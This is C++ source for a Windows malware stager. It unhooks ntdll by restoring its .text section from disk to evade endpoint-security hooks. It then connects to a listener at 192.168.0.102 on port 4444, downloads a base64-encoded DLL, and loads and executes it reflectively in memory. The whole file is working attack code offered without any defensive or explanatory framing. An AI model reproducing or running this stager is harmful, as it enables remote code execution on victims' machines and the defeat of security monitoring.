#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include "base64.h"
#include "MemoryLoadDll.h"
//#include <winternl.h>
#include <psapi.h>
#pragma comment(lib, "ws2_32.lib")

BOOL  NtdllUnhook()
{
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);

	if (GetLastError()==0)
	{
		return TRUE;
	}
	else {
		return FALSE;
	}
}


int main(int argc,char* argv[])
{

	BOOL ret = NtdllUnhook();
	if (!ret)
	{
		return 1;
	}
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	SOCKET ConnectSocket;
	ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in clientService;
	int iResult = 0;

	clientService.sin_family = AF_INET;
#pragma warning(disable : 4996)
	clientService.sin_addr.s_addr = inet_addr("192.168.0.102");
	clientService.sin_port = htons(4444);
	do
	{
		iResult = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
		Sleep(5);
		
	} while (iResult==SOCKET_ERROR);
	

	INT RecvBytes = 0;
	char* bufferReceivedBytes = new char[10000];
	char* DecodeBytes = new char[5120];

	RecvBytes = recv(ConnectSocket, bufferReceivedBytes, 10000, NULL);
	
	INT dwFileSize = 0;
	//接收base64编码后的dll
	dwFileSize = b64_decode((unsigned char*)bufferReceivedBytes, RecvBytes, (unsigned char *)DecodeBytes);
	//解码dll写入DecodeBytes
	iResult = closesocket(ConnectSocket);
	delete[] bufferReceivedBytes;

	LPVOID lpBaseAddress = MmLoadLibrary(DecodeBytes, dwFileSize);

	typedef BOOL(*typedef_dllmain)(void);
	FARPROC dllmain = (FARPROC)MmGetProcAddress(lpBaseAddress, (PCHAR)"DllMain");
	//dllmain();
	//CreateThread(0, 0,(LPTHREAD_START_ROUTINE)dllmain, 0, 0, 0);
	CreateRemoteThread(GetCurrentProcess(), 0, 0, (LPTHREAD_START_ROUTINE)dllmain, 0, 0, 0);


	WSACleanup();
	return 0;
}